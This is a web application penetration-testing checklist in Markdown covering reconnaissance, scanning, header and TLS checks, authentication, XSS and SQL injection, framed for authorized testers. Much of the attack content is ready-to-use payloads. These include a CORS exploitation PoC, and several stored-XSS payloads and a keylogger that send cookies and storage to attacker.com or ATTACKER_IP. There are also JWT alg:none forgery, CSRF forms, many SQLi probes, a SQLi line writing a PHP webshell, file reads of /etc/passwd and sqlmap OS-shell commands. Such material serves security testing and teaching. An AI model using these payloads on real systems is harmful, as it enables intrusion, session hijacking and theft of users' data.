# 🛡️ Web Application Blackbox & Greybox VAPT Checklist

> **Disclaimer:** This checklist is intended for **authorized security professionals only**. Unauthorized testing is illegal. Always obtain written permission before testing.

---

## 📋 Table of Contents

1. [Pre-Engagement](#1-pre-engagement)
2. [Phase 1 — Information Gathering & Footprinting](#2-phase-1--information-gathering--footprinting)
3. [Phase 2 — Scanning & Enumeration](#3-phase-2--scanning--enumeration)
4. [Phase 3 — HTTP Response Header Analysis](#4-phase-3--http-response-header-analysis)
5. [Phase 4 — Cryptographic Vulnerabilities](#5-phase-4--cryptographic-vulnerabilities)
6. [Phase 5 — Authentication & Session Management](#6-phase-5--authentication--session-management)
7. [Phase 6 — Cross-Site Scripting (XSS)](#7-phase-6--cross-site-scripting-xss)
8. [Phase 7 — SQL Injection](#8-phase-7--sql-injection)
9. [Phase 8 — Path Traversal, LFI & RFI](#9-phase-8--path-traversal-lfi--rfi)
10. [Phase 9 — Brute Forcing & Default Credentials](#10-phase-9--brute-forcing--default-credentials)
11. [Phase 10 — HTTP Request Smuggling](#11-phase-10--http-request-smuggling)
12. [Phase 11 — HTTP Verb & Parameter Tampering](#12-phase-11--http-verb--parameter-tampering)
13. [Phase 12 — Common & Classic Vulnerabilities (Shellshock etc.)](#13-phase-12--common--classic-vulnerabilities)
14. [Phase 13 — Insecure Deserialization](#14-phase-13--insecure-deserialization)
15. [Phase 14 — Business Logic & Miscellaneous](#15-phase-14--business-logic--miscellaneous)
16. [Appendix A — Wordlist Reference](#appendix-a--wordlist-reference)
17. [Appendix B — Tool Reference](#appendix-b--tool-reference)
18. [Appendix C — Vulnerability Mapping Reference](#appendix-c--vulnerability-mapping-reference)

---

## 1. Pre-Engagement

### 1.1 Scope Definition

- [ ] Obtain written authorization / Rules of Engagement (RoE) document, NDAs etc.
- [ ] Define in-scope domains, IPs, endpoints using a scoping document.
- [ ] Define out-of-scope assets (e.g., third-party services, payment gateways)
- [ ] Confirm testing window and blackout periods
- [ ] Confirm point of contact (SPOC) for emergencies
- [ ] Set up dedicated testing environment / VPN if required
- [ ] Create a dedicated test account if greybox testing

### 1.2 Tooling Setup

```bash
# Update Kali Linux / Parrot OS
sudo apt update && sudo apt upgrade -y

# Install/verify core tools
which burpsuite nmap gobuster ffuf sqlmap nikto nuclei testssl.sh wfuzz hydra

# Set up Burp Suite proxy (default: 127.0.0.1:8080)
# Configure browser or system proxy accordingly

# Install Nuclei templates
nuclei -update-templates
```

---

## 2. Phase 1 — Information Gathering & Footprinting

> **Goal:** Map the attack surface before touching the target.

| Item | OWASP WSTG | CWE |
|---|---|---|
| Passive recon / OSINT | WSTG-INFO-01 | — |
| Fingerprinting web server | WSTG-INFO-02 | CWE-200 |
| Enumerate application entry points | WSTG-INFO-06 | — |
| Spider / crawl for content | WSTG-INFO-07 | — |

### 2.1 Passive Reconnaissance (OSINT)

- [ ] Google Dork the target
```
site:target.com ext:php | ext:asp | ext:aspx | ext:jsp
site:target.com inurl:admin | inurl:login | inurl:upload
site:target.com filetype:pdf | filetype:xlsx | filetype:docx
"target.com" inurl:".git" OR ".env" OR "backup"
```

- [ ] Check Wayback Machine for old endpoints
```bash
# Wayback Machine
gau target.com --mc 200 --o gau_urls.txt
waybackurls target.com | tee wayback.txt
```

- [ ] Search for subdomains via certificate transparency logs
```bash
# Subdomain enumeration via cert transparency
subfinder -d target.com -all -recursive -o subdomains.txt
amass enum -passive -d target.com -o amass_output.txt

# Certificate transparency
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq '.[].name_value' | sort -u

# BBOT (2025 recommended workflow)
bbot -t target.com -p subdomain-enum cloud-enum email-enum spider
```

- [ ] Search Shodan / Censys for exposed ports and banners
```bash
# Shodan
shodan search "hostname:target.com"
shodan search "ssl.cert.subject.cn:target.com"
```

- [ ] Check GitHub / GitLab for leaked secrets, source code, config files
```
# GitHub dorking
# org:target filename:.env
# "target.com" DB_PASSWORD
# "target.com" secret_key
```


- [ ] Check `robots.txt`, `sitemap.xml`, `.well-known/`
```bash
# Check common sensitive files
for f in robots.txt sitemap.xml .git/HEAD .env web.config crossdomain.xml phpinfo.php; do
  curl -so /dev/null -w "%{http_code} $f\n" https://target.com/$f
done
```
- [ ] Look for exposed `.git`, `.svn`, `.env`, `backup.zip` files
- [ ] Check job postings for technology stack clues


### 2.2 Active Footprinting

- [ ] Identify web server (Apache, Nginx, IIS, Tomcat, etc.)
```bash
# Web server / technology fingerprinting
whatweb -a 3 https://target.com
curl -I https://target.com  # Check Server, X-Powered-By headers
```

- [ ] Identify backend technology (PHP, ASP.NET, Java, Node.js, Python)

```bash
# Technology stack via Wappalyzer CLI
wappalyzer https://target.com
```

**Note**: Look for outdated components, as those can be vulnerabile.

- [ ] Identify WAF / CDN (Cloudflare, Akamai, Imperva, AWS WAF)
```bash
# WAF detection
wafw00f https://target.com
```

**WARN**: `wafw00f` detects the WAF by sending malicious request probes to the application. WAFs may lockout the IP for some duration because of this. 

- [ ] Identify frameworks (WordPress, Laravel, Spring, Django, etc.)
- [ ] Map third-party integrations (payment, analytics, chat widgets)

```bash
# CMS detection
wpscan --url https://target.com --enumerate ap,at,cb,dbe  # WordPress
droopescan scan drupal -u https://target.com              # Drupal
joomscan -u https://target.com                            # Joomla

# Favicon hash to identify framework
python3 -c "import requests, mmh3, base64; r=requests.get('https://target.com/favicon.ico'); print(mmh3.hash(base64.encodebytes(r.content)))"
# Search hash on Shodan: http.favicon.hash:<hash>
```


### 2.3 DNS & Network Mapping

- [ ] Full DNS enumeration (A, MX, TXT, CNAME, NS records)
```bash
# DNS enumeration
dnsx -d target.com -a -aaaa -cname -mx -txt -ns -resp -o dns_records.txt
```

- [ ] DNS Zone transfer attempt
```bash
# Automatic DNS Zone transfer using:
dnsenum zonetransfer.me

# Step 1:  Get all DNS name servers of the target domain:
dig ns <target domain>

#Step 2: Check if NS allows zone transfers
dig axfr @<domain of name server> <target domain> 

Eg : dig axfr @ns1.target.com target.com 
```

- [ ] Reverse DNS lookups
- [ ] Identify CDN bypass / real IP

```bash
# Identify real IP behind CDN
host target.com
curl -s "https://api.hackertarget.com/hostsearch/?q=target.com"

# ASN lookup
whois -h whois.radb.net -- '-i origin AS12345'
```

---

## 3. Phase 2 — Scanning & Enumeration

> **Goal:** Discover all accessible endpoints, directories, and parameters.

### 3.1 Port & Service Scanning

```bash
# Full TCP port scan
nmap -sS -sV -sC -O -T4 -p- target.com -oA nmap_full

# UDP scan (top ports)
sudo nmap -sU --top-ports 200 target.com -oA nmap_udp

# Aggressive scan (only on authorized targets)
nmap -A -T4 target.com

# HTTP service detection
httpx -l subdomains.txt -sc -title -td -favicon -jarm -asn -ss -jsonl -o httpx.jsonl
```

[IANA Service Name and Port Mappings](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml)

Port `0` is a reserved port in TCP/IP networking and is not used in TCP or UDP messages. If anything attempts to bind to port `0` (such as a service), it will bind to the next available port above port `1,024` because port `0` is treated as a "wild card" port.


### 3.2 Directory & File Brute Forcing

- [ ] Enumerate hidden directories
```
ffuf -w directory-list-2.3-medium.txt -u http://target.com/FUZZ -ic
```

- [ ] Identify the application page's extension
```
ffuf -w web-extensions.txt -u http://target.com/indexFUZZ -ic

# With extensions
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.asp,.aspx,.jsp,.bak,.old,.txt,.xml,.conf,.json -mc 200,301,401,403
```

Recursive Fuzzing
```bash
ffuf -w directory-list-2.3-small.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v
```
**Note**: The `-e` flag only extends the `FUZZ` keyword. So, if your `FUZZ` keyword has an `index` listing, then the flag extends it to be `index.php`. Does not work for any other keywords.

- [ ] Enumerate API endpoints
```bash
# API endpoint discovery
ffuf -u https://target.com/api/FUZZ -w seclists/Discovery/Web-Content/api/api-endpoints.txt  -mc 200,201,204,301,302,400,401,403,405
```

- [ ] Vhosts Fuzzing
To scan for VHosts, without manually adding the entire wordlist to our `/etc/hosts`, we will fuzz using the `Host:` header.
```bash
ffuf -w Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://example.com:PORT/ -H 'Host: FUZZ.example.com'
```

- [ ] Parameter Fuzzing
Parameter Fuzzing using `GET` request
```bash
ffuf -w seclists/Discovery/Web-Content/burp-parameter-names.txt:PARAM -u http://example.com:PORT/admin.php?PARAM=123 -fs 753
```

Parameter Fuzzing using `POST` request
```bash
ffuf -w seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://example.com:PORT/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 753
```

Once you found the parameter names, you can fuzz for the parameter values as well.
```bash
ffuf -w ids.txt:FUZZ -u http://example.com:PORT/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 753
```

- [ ] Check for backup files (`.bak`, `.old`, `.swp`, `~`)
```bash
# Directory brute force with ffuf (fast, recommended)
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -mc 200,201,301,302,401,403 -t 50 -o ffuf_dirs.json

# Gobuster
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -x php,asp,aspx,jsp,html,bak -t 50 -o gobuster.txt

# Feroxbuster (recursive)
feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \
  -x php,txt,html,bak -r -t 50 --auto-tune
```

### 3.3 Automated Vulnerability Scanning

```bash
# Nikto web scanner
nikto -h https://target.com -o nikto_report.html -Format html

# Nuclei (template-based scanner)
nuclei -u https://target.com -as -t cves/ -t exposures/ -t misconfiguration/ -t technologies/ -o nuclei_results.txt

# Run all templates
nuclei -u https://target.com -t /root/nuclei-templates/ -severity critical,high,medium -jsonl -o nuclei_all.jsonl
```

---

## 4. Phase 3 — HTTP Response Header Analysis

> **Goal:** Identify missing or misconfigured security headers that expose the application.

| Vulnerability | OWASP | CWE | CVE/Ref |
|---|---|---|---|
| Missing CSP | WSTG-CONF-12 | CWE-693 | — |
| Missing HSTS | WSTG-CONF-07 | CWE-319 | — |
| Missing X-Frame-Options | WSTG-CONF-12 | CWE-1021 | — |
| Missing X-Content-Type-Options | WSTG-CONF-12 | CWE-430 | — |
| Clickjacking | WSTG-CLNT-09 | CWE-1021 | — |
| Information Disclosure via headers | WSTG-INFO-02 | CWE-200 | — |

### 4.1 Checklist

- [ ] **Content-Security-Policy (CSP)** — Missing or weak (e.g., `unsafe-inline`, `unsafe-eval`, wildcard `*`)
- [ ] **Strict-Transport-Security (HSTS)** — Missing, short `max-age`, missing `includeSubDomains`
- [ ] **X-Frame-Options** — Missing → clickjacking possible
- [ ] **X-Content-Type-Options** — Missing `nosniff` → MIME sniffing attacks
- [ ] **Referrer-Policy** — Missing → URL leakage to third parties
- [ ] **Permissions-Policy** — Missing → browser feature abuse
- [ ] **X-XSS-Protection** — Deprecated but check for `0` disabling it in old browsers
- [ ] **Server header** — Discloses web server version
- [ ] **X-Powered-By header** — Discloses tech stack
- [ ] **CORS misconfiguration** — `Access-Control-Allow-Origin: *` with credentials

### 4.2 Testing Commands

```bash
# Fetch all response headers
curl -sI https://target.com

# Check headers with securityheaders.com API equivalent
curl -s "https://api.securityheaders.com/?q=https://target.com&followRedirects=on"

# Manual check for critical headers
curl -sI https://target.com | grep -iE \
  "content-security-policy|strict-transport|x-frame|x-content-type|referrer-policy|permissions-policy|server:|x-powered-by"

# CORS misconfiguration test
curl -H "Origin: https://evil.com" -I https://target.com/api/user
# Look for: Access-Control-Allow-Origin: https://evil.com
# Look for: Access-Control-Allow-Credentials: true

# CSP evaluator (check for bypasses)
# Paste CSP header at: https://csp-evaluator.withgoogle.com/

# Check HSTS preload status
curl -s "https://hstspreload.org/api/v2/status?domain=target.com"
```

### 4.3 CSP Bypass Techniques

```bash
# If CSP allows a trusted domain that hosts JSONP
# Find JSONP endpoint: https://trustedcdn.com/api?callback=alert(1)
# Payload: <script src="https://trustedcdn.com/api?callback=alert(1)"></script>

# Angular CSP bypass (if angular is in allowed sources)
# <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
# <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

# If 'unsafe-inline' is allowed:
<script>alert(document.cookie)</script>

# nonce bypass via DOM clobbering (advanced)
# If nonces are predictable or reused across responses

# Script gadget bypass
# If CSP allows a CDN hosting vulnerable JS libraries with prototype pollution
```

### 4.4 Clickjacking PoC

```html
<!-- Save as clickjack_poc.html and open in browser -->
<!DOCTYPE html>
<html>
<head><title>Clickjacking PoC</title></head>
<body>
  <style>
    iframe {
      width: 900px; height: 600px;
      position: absolute; top: 0; left: 0;
      opacity: 0.5;
      z-index: 2;
    }
    div {
      position: absolute; top: 200px; left: 300px;
      z-index: 1;
      font-size: 24px;
    }
  </style>
  <div>Click Here to Win a Prize!</div>
  <iframe src="https://target.com/account/delete"></iframe>
</body>
</html>
```

### 4.5 CORS Exploitation PoC

```html
<!-- CORS exploitation when Origin reflection + credentials allowed -->
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {
    fetch('https://attacker.com/steal?data=' + btoa(xhr.responseText));
  }
};
xhr.open('GET', 'https://target.com/api/profile', true);
xhr.withCredentials = true;
xhr.send();
</script>
```

---

## 5. Phase 4 — Cryptographic Vulnerabilities

> **Goal:** Identify weak TLS/SSL configurations that expose traffic to interception.

| Vulnerability | OWASP | CWE | CVE |
|---|---|---|---|
| SSLv2 / SSLv3 enabled | WSTG-CRYP-01 | CWE-326 | CVE-2014-3566 (POODLE) |
| TLS 1.0 / 1.1 enabled | WSTG-CRYP-01 | CWE-326 | — |
| BEAST | WSTG-CRYP-01 | CWE-326 | CVE-2011-3389 |
| POODLE | WSTG-CRYP-01 | CWE-326 | CVE-2014-3566 |
| HEARTBLEED | WSTG-CRYP-01 | CWE-126 | CVE-2014-0160 |
| DROWN | WSTG-CRYP-01 | CWE-326 | CVE-2016-0800 |
| ROBOT | WSTG-CRYP-01 | CWE-326 | CVE-2017-13099 |
| LOGJAM (DHE) | WSTG-CRYP-01 | CWE-326 | CVE-2015-4000 |
| SWEET32 (64-bit blocks) | WSTG-CRYP-01 | CWE-326 | CVE-2016-2183 |
| Weak cipher suites | WSTG-CRYP-01 | CWE-327 | — |
| Self-signed / expired cert | WSTG-CRYP-01 | CWE-295 | — |
| Mixed content | WSTG-CRYP-01 | CWE-311 | — |

### 5.1 Testing with testssl.sh

```bash
# Install testssl
git clone https://github.com/drwetter/testssl.sh.git && cd testssl.sh

# Full scan
./testssl.sh https://target.com

# Save HTML report
./testssl.sh --htmlfile testssl_report.html https://target.com

# Check cipher suites
./testssl.sh --cipher-per-proto target.com

# Scan specific port
./testssl.sh target.com:8443

# JSON output for automation
./testssl.sh --jsonfile testssl.json https://target.com
```

### 5.2 Additional TLS Tools

```bash
# Nmap TLS scripts
nmap --script ssl-enum-ciphers -p 443 target.com
nmap --script ssl-heartbleed -p 443 target.com
nmap --script ssl-poodle -p 443 target.com
nmap --script ssl-dh-params -p 443 target.com    # LOGJAM

# sslscan
sslscan target.com:443

# sslyze
sslyze --regular target.com:443
sslyze --heartbleed --robot target.com:443

# OpenSSL manual checks
# Check supported TLS versions
openssl s_client -connect target.com:443 -tls1   # TLS 1.0 (vulnerable)
openssl s_client -connect target.com:443 -tls1_1 # TLS 1.1 (deprecated)
openssl s_client -connect target.com:443 -tls1_2
openssl s_client -connect target.com:443 -tls1_3

# Check certificate details
openssl s_client -connect target.com:443 -showcerts </dev/null 2>/dev/null \
  | openssl x509 -noout -text

# Check for null cipher
openssl s_client -connect target.com:443 -cipher NULL
```

### 5.3 Key Checks

- [ ] SSLv2 / SSLv3 disabled
- [ ] TLS 1.0 / 1.1 disabled (deprecated since 2021)
- [ ] TLS 1.2 and 1.3 supported
- [ ] No RC4, DES, 3DES, EXPORT, or NULL ciphers
- [ ] Certificate chain complete and valid
- [ ] Certificate not expired, not self-signed in production
- [ ] Certificate matches domain (CN/SAN)
- [ ] HSTS header present and `max-age >= 31536000`
- [ ] HPKP checked (now deprecated but legacy apps may misuse it)
- [ ] No Heartbleed, POODLE, BEAST, CRIME, BREACH, DROWN, ROBOT
- [ ] Forward Secrecy (ECDHE) preferred cipher suites
- [ ] DH key size >= 2048 bits (LOGJAM)

---

## 6. Phase 5 — Authentication & Session Management

> **Goal:** Break authentication mechanisms to gain unauthorized access.

| Vulnerability | OWASP | CWE | CVE/Ref |
|---|---|---|---|
| Weak password policy | WSTG-ATHN-07 | CWE-521 | — |
| Account enumeration | WSTG-ATHN-04 | CWE-204 | — |
| Insecure cookie flags | WSTG-SESS-02 | CWE-614 | — |
| Session fixation | WSTG-SESS-03 | CWE-384 | — |
| Predictable session tokens | WSTG-SESS-04 | CWE-330 | — |
| JWT vulnerabilities | WSTG-ATHN | CWE-347 | CVE-2015-9235 |
| CSRF | WSTG-SESS-05 | CWE-352 | — |

### 6.1 Cookie & Session Analysis

```bash
# Check cookie flags
curl -c cookies.txt -I https://target.com/login

# Look for: HttpOnly, Secure, SameSite flags
# Missing flags are vulnerabilities

# Decode session token (base64)
echo "PHPSESSID_VALUE" | base64 -d

# JWT Analysis
# Paste token at https://jwt.io
# Check algorithm: alg: none attack
# Check alg: RS256 -> HS256 attack

# JWT none algorithm exploit
# Modify payload, set alg:none, remove signature
python3 -c "
import base64, json
header = base64.b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({'user':'admin','role':'admin'}).encode()).decode().rstrip('=')
print(f'{header}.{payload}.')
"

# JWT secret brute force
hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt
```

### 6.2 CSRF Testing

```html
<!-- Basic CSRF PoC -->
<html>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/account/email/change" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="confirm_email" value="attacker@evil.com">
  </form>
</body>
</html>

<!-- JSON CSRF (content-type: text/plain) -->
<html>
<body>
  <script>
    fetch('https://target.com/api/email', {
      method: 'POST',
      credentials: 'include',
      headers: {'Content-Type': 'text/plain'},
      body: '{"email":"attacker@evil.com"}'
    });
  </script>
</body>
</html>
```

---

## 7. Phase 6 — Cross-Site Scripting (XSS)

> **Goal:** Inject malicious scripts into web pages viewed by other users.

| Type | OWASP | CWE | CVE Examples | Exploit-DB |
|---|---|---|---|---|
| Reflected XSS | WSTG-CLNT-01, A03:2021 | CWE-79 | CVE-2023-32560 | EDB-50861 |
| Stored XSS | WSTG-CLNT-01, A03:2021 | CWE-79 | CVE-2022-0147 | EDB-49820 |
| DOM-Based XSS | WSTG-CLNT-01, A03:2021 | CWE-79 | CVE-2023-38646 | — |
| mXSS (mutation) | WSTG-CLNT-01 | CWE-79 | — | — |

### 7.1 Reflected XSS

**Detection methodology:**
1. Identify every input field, URL parameter, HTTP header, and JSON parameter
2. Insert a unique marker and search the response for it
3. Determine context (HTML body, attribute, JavaScript, URL)
4. Craft context-appropriate payload

```bash
# Quick probe with marker
curl "https://target.com/search?q=XSS_PROBE_12345" | grep "XSS_PROBE_12345"

# Automated scanning with Dalfox
dalfox url "https://target.com/search?q=test" --silence

# Scan from URL list
dalfox file urls.txt --silence -o xss_results.txt

# XSStrike
python3 xsstrike.py -u "https://target.com/search?q=test"

# Manual Burp Suite: Intruder with XSS payload list
# Use: /usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt
```

**Payloads by injection context:**

```html
<!-- HTML Body Context -->
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onload=alert(document.domain)>
<iframe src="javascript:alert(document.domain)">
<math><mtext></table></p><style><img src=x onerror=alert(1)>

<!-- HTML Attribute Context (break out of attribute) -->
" onmouseover="alert(document.domain)
" autofocus onfocus="alert(document.domain)
'><script>alert(document.domain)</script>
" accesskey="x" onclick="alert(1)"

<!-- JavaScript Context (break out of string) -->
';alert(document.domain)//
\';alert(document.domain)//
</script><script>alert(document.domain)</script>

<!-- JavaScript Context (inside template literal) -->
${alert(document.domain)}

<!-- URL Context -->
javascript:alert(document.domain)

<!-- Filter bypass payloads -->
<ScRiPt>alert(1)</ScRiPt>                    <!-- case variation -->
<script>alert`1`</script>                     <!-- template literal -->
<img src=x onerror=alert&#40;1&#41;>          <!-- HTML entities -->
<svg/onload=alert(1)>                         <!-- no space -->
<img src="x" onerror="&#97;lert(1)">         <!-- encoded -->
<a href="&#106;avascript:alert(1)">click</a> <!-- javascript: encoded -->
<details open ontoggle=alert(1)>              <!-- HTML5 event -->
<video><source onerror="alert(1)">            <!-- video fallback -->

<!-- WAF Bypass -->
<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='))</script>
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
<svg><script>alert&#40;1&#41;</script></svg>

<!-- DOM XSS sinks to check -->
document.write()
document.writeln()
innerHTML
outerHTML
eval()
setTimeout() / setInterval()
location.href
location.hash  ← very common in DOM XSS
document.URL
window.name
```

### 7.2 Stored XSS

- [ ] Test every user-supplied input that is stored and later displayed (comments, profile fields, usernames, addresses, etc.)
- [ ] Test input that is rendered in admin panels (log viewers, support tickets, user management)
- [ ] Test file upload metadata (filename, EXIF data)
- [ ] Test HTTP headers that may be logged and displayed (User-Agent, Referer, X-Forwarded-For)

```bash
# Payload that exfiltrates cookies to attacker-controlled server
<script>document.location='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>

# More stealthy: image-based exfiltration
<img src=x onerror="this.src='https://attacker.com/steal?c='+encodeURIComponent(document.cookie)">

# XSS to session hijacking
<script>
var img = new Image();
img.src = 'https://ATTACKER_IP/steal?cookie=' + encodeURIComponent(document.cookie);
</script>

# XSS keylogger
<script>
document.onkeypress = function(e){
  new Image().src = 'https://attacker.com/log?k=' + e.key;
}
</script>

# Beef Hook (Browser Exploitation Framework)
<script src="http://ATTACKER_IP:3000/hook.js"></script>
```

### 7.3 DOM-Based XSS

```bash
# Sources to audit
# location.hash, location.search, location.href, document.referrer
# window.name, localStorage, sessionStorage, IndexedDB

# Dangerous sinks
# innerHTML, document.write, eval, setTimeout, setInterval
# location.href, location.assign, location.replace

# Find DOM XSS with DOM Invader (Burp Suite)
# Enable DOM Invader in Burp browser → navigate to app → check for canary insertion

# Manual JavaScript audit
grep -r "innerHTML\|document\.write\|eval(" --include="*.js" .

# Automated DOM XSS scanning
python3 domfuzz.py -u "https://target.com/#FUZZ"
```

### 7.4 XSS to RCE via Electron / Desktop Apps

```javascript
// If target is an Electron app, test for nodeIntegration
<script>require('child_process').exec('id', (e,o)=>alert(o))</script>
```

### 7.5 XSS Impact PoC Template

```html
<!-- Professional XSS PoC that shows impact -->
<script>
(function(){
  var data = {
    cookie: document.cookie,
    url: window.location.href,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
  };
  // Exfiltrate to attacker server
  new Image().src = 'https://ATTACKER.COM/collect?data=' + encodeURIComponent(JSON.stringify(data));
  // Show PoC dialog (non-destructive)
  alert('XSS PoC by Security Team\nDomain: ' + document.domain + '\nCookies captured: ' + (document.cookie ? 'YES' : 'NONE'));
})();
</script>
```

> 📎 **References:**
> - [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
> - [HackTricks XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
> - [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

## 8. Phase 7 — SQL Injection

| Type | OWASP | CWE | CVE Examples | Exploit-DB |
|---|---|---|---|---|
| Error-based SQLi | WSTG-INPV-05, A03:2021 | CWE-89 | CVE-2023-23752 | EDB-51166 |
| Union-based SQLi | WSTG-INPV-05 | CWE-89 | CVE-2022-41040 | EDB-50986 |
| Blind (Boolean) SQLi | WSTG-INPV-05 | CWE-89 | CVE-2022-29455 | — |
| Time-based Blind SQLi | WSTG-INPV-05 | CWE-89 | — | EDB-50272 |
| Second-Order SQLi | WSTG-INPV-05 | CWE-89 | — | — |
| Out-of-Band SQLi | WSTG-INPV-05 | CWE-89 | — | — |

### 8.1 Initial Detection

**Test all input parameters:** GET/POST parameters, HTTP headers (User-Agent, Referer, X-Forwarded-For, Cookie), JSON body parameters, XML data.

```bash
# Manual detection probes (insert into parameter value)
'
''
#
;
)
`
')
"))
' OR '1'='1
' OR '1'='1'-- -
' OR 1=1-- -
" OR 1=1-- -
' OR 'a'='a
1' AND SLEEP(5)-- -
1; WAITFOR DELAY '0:0:5'--   (MSSQL)
1 AND 1=CONVERT(int,(SELECT @@version))--
```

**Note**: In some cases, we may have to use the URL encoded version of the payload.

### 8.2 Error-Based SQLi

```sql
-- MySQL: Extract version via error
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND UPDATEXML(1,concat(0x7e,(SELECT database())),1)-- -
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -

-- MSSQL: Extract via error
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--

-- PostgreSQL
' AND CAST((SELECT version()) AS int)--
```

### 8.3 Union-Based SQLi

```sql
-- Step 1: Find number of columns
' ORDER BY 1--       (increment until error)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Step 2: Find printable column
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--

-- Step 3: Extract data (MySQL, 3 columns)
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password,NULL FROM users--

-- Concatenate multiple values
' UNION SELECT concat(username,':',password),NULL,NULL FROM users--

-- MySQL: Read files via UNION
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--

-- MySQL: Write webshell via INTO OUTFILE
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
```

### 8.4 Blind Boolean-Based SQLi

```sql
-- Baseline (true vs false response)
' AND 1=1--   (true — normal response)
' AND 1=2--   (false — different/empty response)

-- Extract database name character by character
' AND SUBSTRING(database(),1,1)='a'--
' AND ASCII(SUBSTRING(database(),1,1))>96--

-- Automate with sqlmap
sqlmap -u "https://target.com/item?id=1" --technique=B --dbms=mysql --dbs
```

### 8.5 Time-Based Blind SQLi

```sql
-- MySQL
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (SELECT COUNT(*) FROM sysobjects WHERE name='users')>0 WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--

-- Automate
sqlmap -u "https://target.com/item?id=1" --technique=T --dbms=mysql --dbs --time-sec=5
```

### 8.6 Second-Order SQLi

> Occurs when user input is stored safely (sanitized) but used later in an unsafe context.

```bash
# Scenario: Change password functionality
# 1. Register username: admin'--
# 2. When app runs: UPDATE users SET password='new' WHERE username='admin'--'
# This comments out rest of query, changing admin's password

# Detection: Register payload, then trigger stored action
# Example payloads for username:
admin'--
admin'/*
' OR 1=1--
1' AND SLEEP(5)--
```

### 8.7 Automated SQLi with sqlmap

```bash
# Basic scan
sqlmap -u "https://target.com/page?id=1" --batch

# POST request
sqlmap -u "https://target.com/login" --data="username=admin&password=pass" --batch

# With Burp request file (recommended for complex apps)
# Save request from Burp → File → Save item
sqlmap -r request.txt --batch --level=5 --risk=3

# Dump specific database
sqlmap -r request.txt --batch -D target_db --dump

# Dump all databases
sqlmap -r request.txt --batch --dbs

# Attempt OS shell
sqlmap -r request.txt --batch --os-shell

# Bypass WAF with tamper scripts
sqlmap -r request.txt --tamper=space2comment,between,randomcase --batch

# All tamper scripts
sqlmap -r request.txt --tamper=apostrophemask,base64encode,between,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,space2comment,space2dash,space2hash,space2morenewlines,space2plus,space2randomblank,unionalltounion,unmagicquotes --batch

# JSON parameter injection
sqlmap -u "https://target.com/api/item" --data='{"id":"1"}' \
  --headers="Content-Type: application/json" --batch

# Cookie injection
sqlmap -u "https://target.com/" --cookie="session=abc*" --batch
```

### 8.8 NoSQL Injection

```bash
# MongoDB NoSQL injection
# Authentication bypass
username: {"$gt": ""}
password: {"$gt": ""}

# In URL
https://target.com/users?username[$gt]=&password[$gt]=

# In JSON body
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

# Automated tool
python3 nosqlmap.py --url "https://target.com/login" --attack 2
```

- Note that we can also read files using an SQLi vulnerability using the `LOAD_FILE()` functionality, which forms am SQLi leading to LFI.
```sql
admin' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```
- Some SQIis allow attackers to write files, such as Webshells.
```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```


> 📎 **References:**
> - [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
